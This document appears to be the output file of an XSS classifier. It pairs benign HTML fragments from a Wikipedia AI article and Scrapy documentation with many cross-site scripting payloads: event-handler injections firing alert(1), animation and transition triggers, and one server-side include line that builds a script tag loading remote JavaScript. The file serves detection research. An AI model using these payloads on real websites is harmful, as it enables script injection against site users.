Unnamed: 0,payload,label,predicted_label,probability
9482,"<li><a href=""/wiki/Ubiquitous_robot"" title=""Ubiquitous robot"">Ubiquitous </a> </li> </ul>",0,0,0.00011671706
4905,<acronym onpointerup=alert(1)>XSS</acronym>,1,1,0.9982832
12590,"<h4><span class=""mw-headline"" id=""Knowledge-based"">Knowledge-based ",0,0,0.00054647063
8167,"<li><a href=""/wiki/Open-source_software"" title=""Open-source software"">Open-source model </a> </li> </ul>",0,0,0.00020420956
11141,"<li><cite id=""CITEREFRussellNorvig2003"" class=""citation""><a href=""/wiki/Stuart_J._Russell"" title=""Stuart J. Russell"">Russell, Stuart J. </a>; <a href=""/wiki/Peter_Norvig"" title=""Peter Norvig"">Norvig, Peter </a> (2003), <a rel=""nofollow"" class=""external text"" href=""http://aima.cs.berkeley.edu/""><i>Artificial Intelligence: A Modern Approach </i> </a> (2nd ed.), Upper Saddle River, New Jersey: Prentice Hall, <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/0-13-790395-2"" title=""Special:BookSources/0-13-790395-2""><bdi>0-13-790395-2 </bdi> </a> </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Artificial+Intelligence%3A+A+Modern+Approach&amp;rft.place=Upper+Saddle+River%2C+New+Jersey&amp;rft.edition=2nd&amp;rft.pub=Prentice+Hall&amp;rft.date=2003&amp;rft.isbn=0-13-790395-2&amp;rft.aulast=Russell&amp;rft.aufirst=Stuart+J.&amp;rft.au=Norvig%2C+Peter&amp;rft_id=http%3A%2F%2Faima.cs.berkeley.edu%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,0,2.525677e-06
594,<dd id=x tabindex=1 onfocus=alert(1)></dd>,1,1,0.99270266
10283,"<li id=""cite_note-57""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-57"">^ </a> </b> ",0,0,0.00023456663
761,"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=23"" title=""Edit section: Computational intelligence and soft computing"">edit </a><span class=""mw-editsection-bracket"">] ",0,0,2.6010332e-05
7162,"<div class=""section"" id=""solving-specific-problems"">",0,0,0.003240408
8864,"<nobr draggable=""true"" ondragleave=""alert(1)"">test</nobr>",1,1,0.9982378
11325,"<style>@keyframes x{}</style><aside style=""animation-name:x"" onanimationstart=""alert(1)""></aside>",1,1,0.9975039
8041,"<style>:target {color: red;}</style><track id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></track>",1,1,0.9978726
11502,"<progress draggable=""true"" ondragend=""alert(1)"">test</progress>",1,1,0.99836725
9661,"<script draggable=""true"" ondragenter=""alert(1)"">test</script>",1,1,0.9972903
9430,"<div draggable=""true"" contenteditable>drag me</div><rtc ondragover=alert(1) contenteditable>drop here</rtc>",1,1,0.9956736
628,"<progress draggable=""true"" ondrag=""alert(1)"">test</progress>",1,1,0.99836653
933,"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://.rocks/.js></SCRIPT>'""",1,0,0.0044083525
7540,<fieldset onpointerleave=alert(1)>XSS</fieldset>,1,1,0.97352415
12681,<ul>,0,0,0.0012222066
9421,<svg><picture onload=alert(1)></picture>,1,1,0.99669814
1256,"<iframe onbeforepaste=""alert(1)"" contenteditable>test</iframe>",1,1,0.9943056
1000,<embed id=x tabindex=1 onbeforedeactivate=alert(1)></embed><input autofocus>,1,1,0.9970272
2769,"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=62"" title=""Edit section: Computationalism and functionalism"">edit </a><span class=""mw-editsection-bracket"">] ",0,0,2.2045573e-05
4087,	 </span>,0,0,6.0303642e-05
6125,"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Fast+Company&amp;rft.atitle=Elon+Musk+Is+Donating+%2410M+Of+His+Own+Money+To+Artificial+Intelligence+Research&amp;rft.date=2015-01-15&amp;rft_id=http%3A%2F%2Fwww.fastcompany.com%2F3041007%2Ffast-feed%2Felon-musk-is-donating-10m-of-his-own-money-to-artificial-intelligence-research&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,0,2.2071197e-06
11271,"<li><a href=""/wiki/Rhetoric_of_science"" title=""Rhetoric of science"">Rhetoric of science </a> </li>",0,0,0.00018920096
5176,"<li id=""cite_note-Searle&#39;s_strong_AI-404""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Searle&#39;s_strong_AI_404-0"">^ </a> </b> ",0,0,0.00011624755
2086,"<i draggable=""true"" ondragstart=""alert(1)"">test</i>",1,1,0.993895
11995,"<center onpaste=""alert(1)"" contenteditable>test</center>",1,1,0.9978549
1984,"<meta onmousedown=""alert(1)"">test</meta>",1,1,0.998112
11979,"<li><a href=""/wiki/Humanity%2B"" title=""Humanity+"">Humanity+ </a> </li>",0,0,0.00013106203
7705,"<li><a href=""/wiki/Leverhulme_Centre_for_the_Future_of_Intelligence"" title=""Leverhulme Centre for the Future of Intelligence"">Leverhulme Centre for the Future of Intelligence </a> </li>",0,0,0.0001830813
10756,"<image draggable=""true"" ondragstart=""alert(1)"">test</image>",1,1,0.99708724
8792,"<li><a href=""/wiki/Robot_Hall_of_Fame"" title=""Robot Hall of Fame"">Hall of Fame </a> </li>",0,0,0.00018641089
13210,"<multicol onmouseenter=""alert(1)"">test</multicol>",1,1,0.99599165
2822,	 <div>,0,0,5.0404815e-05
107,"<li><a href=""/wiki/Underdetermination"" title=""Underdetermination"">Underdetermination </a> </li>",0,0,0.0025099397
10269,"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,0,6.386378e-05
10826,"	 </span> <span class=""reference-text"">",0,0,4.9663875e-05
6333,"	<div id=""siteNotice"" class=""mw-body-content""></div>",0,0,4.8483642e-05
9747,"	 <div class=""thumb tright"">",0,0,4.4025746e-05
11083,"	 <div><a href=""/wiki/File:Shadow_Hand_Bulb_large.jpg"" class=""image""><img alt=""Shadow Hand Bulb large.jpg"" src=""//upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Shadow_Hand_Bulb_large.jpg/100px-Shadow_Hand_Bulb_large.jpg"" decoding=""async"" width=""100"" height=""150"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Shadow_Hand_Bulb_large.jpg/150px-Shadow_Hand_Bulb_large.jpg 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Shadow_Hand_Bulb_large.jpg/200px-Shadow_Hand_Bulb_large.jpg 2x"" data-file-width=""2560"" data-file-height=""3840"" /> </a> </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Robot"" title=""Robot"">Types </a> </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,0,9.980296e-06
1349,<param id=x tabindex=1 onfocusin=alert(1)></param>,1,1,0.9975485
8709,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,0,2.1147165e-05
10807,"	 </span>. <i>Journal of Informetrics </i>. <b>5 </b> (4): 629–649. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2Fj.joi.2011.06.002"">10.1016/j.joi.2011.06.002 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Journal+of+Informetrics&amp;rft.atitle=Comparing+the+expert+survey+and+citation+impact+journal+ranking+methods%3A+Example+from+the+field+of+Artificial+Intelligence&amp;rft.volume=5&amp;rft.issue=4&amp;rft.pages=629-649&amp;rft.date=2011&amp;rft_id=info%3Adoi%2F10.1016%2Fj.joi.2011.06.002&amp;rft.aulast=Serenko&amp;rft.aufirst=Alexander&amp;rft.au=Michael+Dohan&amp;rft_id=http%3A%2F%2Fwww.aserenko.com%2Fpapers%2FJOI_AI_Journal_Ranking_Serenko.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,0,9.628628e-06
12479,"<small onmouseup=""alert(1)"">test</small>",1,1,0.99620867
12851,<aside id=x tabindex=1 ondeactivate=alert(1)></aside><input id=y autofocus>,1,1,0.9937916
11158,"	 </span>. <i>Proceedings of the SPIE AeroSense Session on Unmanned Ground Vehicle Technology </i>. Unmanned Ground Vehicle Technology IV. <b>3693 </b>. pp.&#160;11–20. <a href=""/wiki/Bibcode"" title=""Bibcode"">Bibcode </a>:<a rel=""nofollow"" class=""external text"" href=""https://ui.adsabs.harvard.edu/abs/2002SPIE.4715..303A"">2002SPIE.4715..303A </a>. <a href=""/wiki/CiteSeerX"" title=""CiteSeerX"">CiteSeerX </a>&#160;<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.15.14"">10.1.1.15.14 </a> ",0,0,2.0003474e-06
12768,"<s onbeforecopy=""alert(1)"" contenteditable>test</s>",1,1,0.99641633
1601,"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;18–21 </li> </ul>",0,0,0.00013756371
1580,"<li><a href=""/wiki/Cuckoo_search"" title=""Cuckoo search"">Cuckoo search </a> </li>",0,0,0.00019004078
1958,"<option onbeforecut=""alert(1)"" contenteditable>test</option>",1,1,0.9979895
10448,"<h4><span class=""mw-headline"" id=""Decrease_in_demand_for_human_labor"">Decrease in demand for human labor ",0,0,0.0005108806
6159,"<div draggable=""true"" contenteditable>drag me</div><cite ondrop=alert(1) contenteditable>drop here</cite>",1,1,0.9956325
7737,"<del draggable=""true"" ondragenter=""alert(1)"">test</del>",1,1,0.99491745
1041,"<li><a href=""/wiki/Claytronics"" title=""Claytronics"">Claytronics </a> </li>",0,0,0.0001097262
6393,"<aside draggable=""true"" ondragstart=""alert(1)"">test</aside>",1,1,0.99663436
10390,"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;227–243, </li>",0,0,0.0001346544
2377,"<li id=""cite_note-AI&#39;s_immediate_precursors-156""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-AI&#39;s_immediate_precursors_156-0"">^ </a> </b> ",0,0,0.00011488341
7595,"	<ul id=""footer-info"" class="""">",0,0,6.472446e-05
7828,	 </span> </h3>,0,0,4.0975585e-05
2124,"<menuitem onmouseleave=""alert(1)"">test</menuitem>",1,1,0.9978324
5657,"The <a href=""/wiki/Turing_test"" title=""Turing test"">Turing test </a>:<br />",0,0,0.0010416255
441,"<li><a href=""/wiki/Larry_Laudan"" title=""Larry Laudan"">Larry Laudan </a> </li>",0,0,0.00010908607
5279,"<li><a href=""/wiki/Evolutionary_programming"" title=""Evolutionary programming"">Evolutionary programming </a> </li>",0,0,0.0022032862
12002,"<dt><a class=""reference internal"" href=""topics/broad-crawls.html""><span class=""doc"">Broad Crawls",0,0,0.00055493694
9942,"<xmp draggable=""true"" ondragstart=""alert(1)"">test</xmp>",1,1,0.99793965
525,"        <nav data-toggle=""wy-nav-shift"" class=""wy-nav-side"">",0,0,5.137671e-05
2987,"<area ondblclick=""alert(1)"">test</area>",1,1,0.9962872
10400,"<table onbeforecut=""alert(1)"" contenteditable>test</table>",1,1,0.9971572
6561,<ul>,0,0,0.0012222066
8987,"<li><a href=""/wiki/Materialism"" title=""Materialism"">Materialism </a> </li>",0,0,0.00010635501
4896,<dialog onpointerenter=alert(1)>XSS</dialog>,1,1,0.99622554
6978,"<kbd onmousemove=""alert(1)"">test</kbd>",1,1,0.9976476
12273,"<style>:target {color:red;}</style><colgroup id=x style=""transition:color 1s"" ontransitionend=alert(1)></colgroup>",1,1,0.99791455
9849,"<li><a href=""#CITEREFPooleMackworth2017"">Poole &amp; Mackworth 2017 </a>, Section 3.6 </li> </ul>",0,0,0.00013722542
12356,<slot onblur=alert(1) tabindex=1 id=x></slot><input autofocus>,1,1,0.99698865
6564,"<img onmousedown=""alert(1)"">test</img>",1,1,0.9967272
2591,"	 </span> </a> </i>&#93; </sup>, including <a href=""/wiki/Computer_vision"" title=""Computer vision"">computer vision </a>, <a href=""/wiki/Speech_recognition"" title=""Speech recognition"">speech recognition </a>, <a href=""/wiki/Natural_language_processing"" title=""Natural language processing"">natural language processing </a> and others.<sup id=""cite_ref-goodfellow2016_247-0"" class=""reference""><a href=""#cite_note-goodfellow2016-247"">&#91;236&#93; </a> </sup><sup id=""cite_ref-HintonDengYu2012_248-0"" class=""reference""><a href=""#cite_note-HintonDengYu2012-248"">&#91;237&#93; </a> </sup><sup id=""cite_ref-schmidhuber2015_246-1"" class=""reference""><a href=""#cite_note-schmidhuber2015-246"">&#91;235&#93; </a> </sup>",0,0,1.2732029e-06
6010,<code id=x tabindex=1 onbeforeactivate=alert(1)></code>,1,1,0.99570274
8176,"<div class=""toctree-wrapper compound"">",0,0,0.00752748
12380,"<style>:target {transform: rotate(180deg);}</style><tt id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></tt>",1,1,0.9979872
11247,"<shadow onkeyup=""alert(1)"" contenteditable>test</shadow>",1,1,0.9920983
681,"	 </span> <span class=""toctext"">Cybernetics and brain simulation ",0,0,0.0008238655
1629,"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=www-formal.stanford.edu&amp;rft.atitle=Applications+of+AI&amp;rft_id=http%3A%2F%2Fwww-formal.stanford.edu%2Fjmc%2Fwhatisai%2Fnode3.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,0,2.1719488e-05
13598,"<style>:target {color:red;}</style><pre id=x style=""transition:color 1s"" ontransitionend=alert(1)></pre>",1,1,0.9979124
1358,"<li id=""cite_note-341""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-341"">^ </a> </b> ",0,0,0.00011244965
10836,<main id=x tabindex=1 onactivate=alert(1)></main>,1,1,0.9954935
1034,	 </span>,0,0,6.0303642e-05
2101, ,0,0,0.0009942207
5324,<em onpointermove=alert(1)>XSS</em>,1,1,0.99771
3529,"<cite onmouseup=""alert(1)"">test</cite>",1,1,0.99605876
5377, </div>,0,0,0.00023409097
6123,"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;300–301, </li>",0,0,0.00013690768
4710,"<a oncut=""alert(1)"" contenteditable>test</a>",1,1,0.99662685
3540,<address onpointerenter=alert(1)>XSS</address>,1,1,0.9979962
1700,	 </span> </a> </li>,0,0,3.6811532e-05
10877,"<li><a href=""/wiki/Decision_theory"" title=""Decision theory"">Decision theory </a> </li>",0,0,0.00018834401
3448,"<style>@keyframes x{}</style><legend style=""animation-name:x"" onanimationend=""alert(1)""></legend>",1,1,0.99749815
11029,<hgroup onpointerover=alert(1)>XSS</hgroup>,1,1,0.99679506
10169,<sup id=x tabindex=1 ondeactivate=alert(1)></sup><input id=y autofocus>,1,1,0.9931681
5217,<image3 onpointerout=alert(1)>XSS</image3>,1,1,0.9965679
13452,"<h3><span class=""mw-headline"" id=""Law-related_professions"">Law-related professions ",0,0,0.00042298858
7714,"<fieldset draggable=""true"" ondragstart=""alert(1)"">test</fieldset>",1,1,0.97576714
10270,"<address onpaste=""alert(1)"" contenteditable>test</address>",1,1,0.9979639
3654,"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=61"" title=""Edit section: Consciousness"">edit </a><span class=""mw-editsection-bracket"">] ",0,0,2.323558e-05
5896,"<i draggable=""true"" ondragend=""alert(1)"">test</i>",1,1,0.99366456
7490,"<aside onmousedown=""alert(1)"">test</aside>",1,1,0.9967041
2883,"          <dd><a href=""/en/1.1/"">1.1</a></dd>",0,0,3.9786253e-05
492,"<li><a href=""/wiki/Alexey_Lyapunov"" title=""Alexey Lyapunov"">Alexey Lyapunov </a> </li>",0,0,0.00011313239
6002,"<frame onmouseleave=""alert(1)"">test</frame>",1,1,0.99703974
3222,"<command onmouseenter=""alert(1)"">test</command>",1,1,0.9983392
12009,"<dt><a class=""reference internal"" href=""news.html""><span class=""doc"">Release notes",0,0,0.0012549341
10300,"<BODY BACKGROUND=""javascript:alert('')"">",1,1,0.9981921
2203,"<a href=""/wiki/History_of_artificial_intelligence"" title=""History of artificial intelligence"">History </a> </th> </tr><tr><td class=""plainlist"" style=""padding:0 0.1em 0.4em"">",0,0,0.0005998162
5598,"<p onmouseout=""alert(1)"">test</p>",1,1,0.9972305
13518,	 </span>,0,0,6.0303642e-05
4322,"	 </span> <span class=""reference-text""><a href=""#CITEREFKismet""><i>Kismet </i> </a>. ",0,0,2.054081e-05
6835, </li>,0,0,0.00012413738
13169,"<code oncontextmenu=""alert(1)"">test</code>",1,1,0.99780846
9485,"<li><a href=""/wiki/Chinese_room"" title=""Chinese room"">Chinese room </a> </li>",0,0,0.00018445117
3722,"<option onclick=""alert(1)"">test</option>",1,1,0.99679893
6967, </li>,0,0,0.00012413738
9722,"<style>@keyframes x{}</style><html style=""animation-name:x"" onanimationend=""alert(1)""></html>",1,1,0.9974752
12575,"<style>:target {color:red;}</style><main id=x style=""transition:color 1s"" ontransitionend=alert(1)></main>",1,1,0.9979121
1388,<q id=x tabindex=1 onbeforedeactivate=alert(1)></q><input autofocus>,1,1,0.9900672
4980,"	 <sup id=""cite_ref-133"" class=""reference""><a href=""#cite_note-133"">&#91;130&#93; </a> </sup>",0,0,2.13193e-05
7237,<base id=x tabindex=1 onactivate=alert(1)></base>,1,1,0.99664694
5079,"<legend draggable=""true"" ondragend=""alert(1)"">test</legend>",1,1,0.9955967
7989,"	 </span>. Harvard University Press. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-674-57616-2"" title=""Special:BookSources/978-0-674-57616-2""><bdi>978-0-674-57616-2 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Mind+Children&amp;rft.pub=Harvard+University+Press&amp;rft.date=1988&amp;rft.isbn=978-0-674-57616-2&amp;rft.aulast=Moravec&amp;rft.aufirst=Hans&amp;rft_id=https%3A%2F%2Farchive.org%2Fdetails%2Fmindchildrenfutu00mora&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,0,4.2820293e-06
5764,<blink id=x tabindex=1 ondeactivate=alert(1)></blink><input id=y autofocus>,1,1,0.9803458
928,"<li><a href=""/wiki/Imre_Lakatos"" title=""Imre Lakatos"">Imre Lakatos </a> </li>",0,0,0.000117795695
6724,<strike id=x tabindex=1 onbeforedeactivate=alert(1)></strike><input autofocus>,1,1,0.9967295
11535,"<li><a href=""/wiki/Idealism"" title=""Idealism"">Idealism </a> </li>",0,0,0.00016474612
8605,"<acronym onmouseleave=""alert(1)"">test</acronym>",1,1,0.9982821
11009,"<span onbeforecut=""alert(1)"" contenteditable>test</span>",1,1,0.9973291
9837,</script><script>alert('');</script>,1,1,0.9883739
3743,<rp onblur=alert(1) tabindex=1 id=x></rp><input autofocus>,1,1,0.9973944
4842, </li>,0,0,0.00012413738
9362,             </li> </ul>,0,0,4.702852e-05
1001,"<dir draggable=""true"" ondragend=""alert(1)"">test</dir>",1,1,0.99652845
1265,"<li><a href=""/wiki/Wilhelm_Wundt"" title=""Wilhelm Wundt"">Wilhelm Wundt </a> </li>",0,0,0.00017162324
10606,<custom tags onpointerleave=alert(1)>XSS</custom tags>,1,1,0.9976855
